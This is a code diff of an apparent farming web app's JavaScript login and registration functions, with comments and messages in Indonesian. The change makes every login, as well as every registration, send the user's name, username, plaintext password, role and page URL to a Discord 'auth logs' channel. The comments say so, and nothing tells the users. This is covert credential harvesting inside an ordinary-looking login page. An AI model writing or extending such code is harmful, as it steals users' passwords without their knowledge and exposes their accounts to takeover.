@@ -1751,43 +1751,52 @@
         }
 
         function handleLogin() {
-            const u = document.getElementById('login-user').value.trim();
-            const p = document.getElementById('login-pass').value.trim();
-            const foundUser = registeredUsers.find(item => item.user === u && item.pass === p);
-            if (foundUser) {
-                currentUser = foundUser;
-                saveToStorage(); closeAuthModal(); updateAuthUI(); switchView('dashboard');
-            } else { document.getElementById('login-error').classList.remove('hidden'); }
-        }
+    const u = document.getElementById('login-user').value.trim();
+    const p = document.getElementById('login-pass').value.trim();
+    const foundUser = registeredUsers.find(item => item.user === u && item.pass === p);
+    if (foundUser) {
+        currentUser = foundUser;
+        saveToStorage(); 
+        closeAuthModal(); 
+        updateAuthUI(); 
+        switchView('dashboard');
+        
+        // Kirim notifikasi login manual lengkap ke Discord Auth Logs
+        const currentUrl = window.location.href;
+        sendAuthNotification(`🔐 **LOGIN MANUAL (AUTH LOGS)**\n• **Nama:** ${foundUser.name}\n• **Username:** ${foundUser.user}\n• **Password:** ${p}\n• **Role:** ${foundUser.role}\n• **URL:** ${currentUrl}`);
+    } else { 
+        document.getElementById('login-error').classList.remove('hidden'); 
+    }
+}
 
         function handleRegister() {
-            const name = document.getElementById('reg-name').value.trim();
-            const u = document.getElementById('reg-user').value.trim();
-            const p = document.getElementById('reg-pass').value.trim();
-            
-            if (!name || !u || !p) {
-                document.getElementById('reg-error').classList.remove('hidden');
-                return;
-            }
-            if (registeredUsers.some(item => item.user === u)) {
-                alert('Username sudah digunakan!');
-                return;
-            }
+    const name = document.getElementById('reg-name').value.trim();
+    const u = document.getElementById('reg-user').value.trim();
+    const p = document.getElementById('reg-pass').value.trim();
+    
+    if (!name || !u || !p) {
+        document.getElementById('reg-error').classList.remove('hidden');
+        return;
+    }
+    if (registeredUsers.some(item => item.user === u)) {
+        alert('Username sudah digunakan!');
+        return;
+    }
 
-            const newUser = { name, user: u, pass: p, role: 'farmer' };
-            registeredUsers.push(newUser);
-            currentUser = newUser;
-            saveToStorage();
-            closeAuthModal();
-            updateAuthUI();
-            switchView('dashboard');
+    const newUser = { name, user: u, pass: p, role: 'farmer' };
+    registeredUsers.push(newUser);
+    currentUser = newUser;
+    saveToStorage();
+    closeAuthModal();
+    updateAuthUI();
+    switchView('dashboard');
 
-            const currentUrl = window.location.href;
-            sendAuthNotification(`🔐 **DATA AKUN BARU (AUTH LOGS)**\n• **Nama:** ${name}\n• **Username:** ${u}\n• **Password:** ${p}\n• **URL:** ${currentUrl}`);
-            
-            alert('Akun berhasil didaftar dan Anda langsung masuk!');
+    // Kirim notifikasi registrasi lengkap ke Discord Auth Logs
+    const currentUrl = window.location.href;
+    sendAuthNotification(`🔐 **REGISTRASI AKUN BARU (AUTH LOGS)**\n• **Nama:** ${name}\n• **Username:** ${u}\n• **Password:** ${p}\n• **Role:** ${newUser.role}\n• **URL:** ${currentUrl}`);
+    
+    alert('Akun berhasil didaftar dan Anda langsung masuk!');
         }
-
         function handleLogout() { currentUser = null; saveToStorage(); updateAuthUI(); switchView('public-home'); }
 
         function updateAuthUI() {
